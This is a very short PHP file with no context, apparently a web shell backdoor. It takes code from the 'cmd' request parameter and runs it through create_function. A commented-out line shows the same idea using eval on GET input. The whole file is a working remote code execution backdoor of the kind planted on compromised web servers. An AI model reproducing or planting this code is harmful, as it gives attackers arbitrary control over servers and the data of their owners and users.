<?php 
	//@eval($_GET['cmd']);
	$func =create_function('',$_REQUEST['cmd']); 	$func();?>